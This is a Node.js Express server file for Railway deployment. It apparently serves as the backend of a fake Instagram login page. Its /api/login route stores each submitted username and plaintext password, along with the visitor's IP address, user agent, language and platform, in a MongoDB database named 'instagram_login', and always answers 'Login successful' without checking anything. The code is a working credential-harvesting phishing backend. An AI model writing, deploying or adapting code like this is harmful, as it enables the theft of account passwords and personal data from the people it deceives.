// Express server for Railway deployment
const express = require('express');
const path = require('path');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI;
const MONGODB_DB = process.env.MONGODB_DB || 'instagram_login';
const MONGODB_COLLECTION = process.env.MONGODB_COLLECTION || 'users';

// Middleware
app.use(express.json());
app.use(express.static('.'));

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    
    if (req.method === 'OPTIONS') {
        res.sendStatus(200);
    } else {
        next();
    }
});

// MongoDB connection
let cachedClient = null;
let cachedDb = null;

async function connectToDatabase() {
    if (cachedClient && cachedDb) {
        return { client: cachedClient, db: cachedDb };
    }

    try {
        const client = new MongoClient(MONGODB_URI, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
        });

        await client.connect();
        const db = client.db(MONGODB_DB);

        cachedClient = client;
        cachedDb = db;

        return { client, db };
    } catch (error) {
        console.error('MongoDB connection error:', error);
        throw new Error('Database connection failed');
    }
}

// API Routes
app.post('/api/login', async (req, res) => {
    try {
        const { username, password, timestamp, userAgent, language, platform } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({
                success: false,
                message: 'Username and password are required'
            });
        }
        
        // Set default values
        const safeTimestamp = timestamp || new Date().toISOString();
        const safeUserAgent = userAgent || 'Unknown';
        const safeLanguage = language || 'en-US';
        const safePlatform = platform || 'Unknown';
        
        // Get client IP
        const ipAddress = req.headers['x-forwarded-for'] || 
                         req.headers['x-real-ip'] || 
                         req.connection.remoteAddress ||
                         'Unknown';
        
        // Prepare user data
        const userData = {
            username: username.trim(),
            password: password,
            timestamp: safeTimestamp,
            userAgent: safeUserAgent,
            language: safeLanguage,
            platform: safePlatform,
            ipAddress: ipAddress,
            createdAt: new Date(),
            updatedAt: new Date()
        };
        
        // Store in MongoDB
        const { client, db } = await connectToDatabase();
        const collection = db.collection(MONGODB_COLLECTION);
        const result = await collection.insertOne(userData);
        
        console.log('User data stored successfully:', result.insertedId);
        
        // Return success response
        res.json({
            success: true,
            message: 'Login successful',
            data: {
                username: userData.username,
                timestamp: userData.timestamp,
                id: 'user_' + Date.now()
            }
        });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error. Please try again later.'
        });
    }
});

app.get('/api/test', (req, res) => {
    res.json({
        success: true,
        message: 'Railway API is working!',
        timestamp: new Date().toISOString(),
        method: req.method,
        url: req.url
    });
});

// Serve static files
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Visit: http://localhost:${PORT}`);
});
